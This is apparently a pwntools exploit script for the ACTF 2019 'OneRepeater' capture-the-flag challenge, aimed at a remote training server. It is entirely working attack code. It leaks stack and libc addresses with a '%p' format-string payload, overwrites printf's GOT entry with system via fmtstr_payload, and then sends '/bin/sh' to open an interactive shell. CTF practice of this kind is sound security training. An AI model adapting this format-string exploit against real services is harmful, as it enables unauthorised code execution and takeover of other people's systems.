from pwn import *
filename="./ACTF_2019_OneRepeater"
# libc_name="/home/nicholas/glibc-all-in-one/libs/libc6_2.27-3ubuntu1_i386/libc.so.6"
libc_name = "./libc-2.27.so"
# io = process(filename)
io = remote('node4.buuoj.cn',27458)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']

def debug():
    gdb.attach(io,"b *0x08048721")

def sendchoice(id):
    io.recvuntil('Exit\n')
    io.sendline(str(id))

# debug()
payload1 = ".%p"*10
sendchoice(1)
buf_addr = int(io.recvuntil('\n',drop=True),16)
success("buf_addr: " + hex(buf_addr))
io.sendline(payload1)


sendchoice(2)
io.recvuntil('\xf7')
libc_info = u32(io.recvuntil('\xf7')[-4:])
success("libc_info: " + hex(libc_info))
stack_info = u32(io.recvuntil('\xff')[-4:])
success("stack_info: " + hex(stack_info))

libc_base = libc_info - 0x004012
success("libc_base: " + hex(libc_base))
system = libc_base + libc.symbols['system']

printf_got = elf.got['printf']
payload = fmtstr_payload(16,{printf_got:system})
sendchoice(1)
io.sendline(payload)
# debug() # check printf->system
sendchoice(2)

sendchoice(1)
io.sendline('/bin/sh\x00')
sendchoice(2)


io.interactive()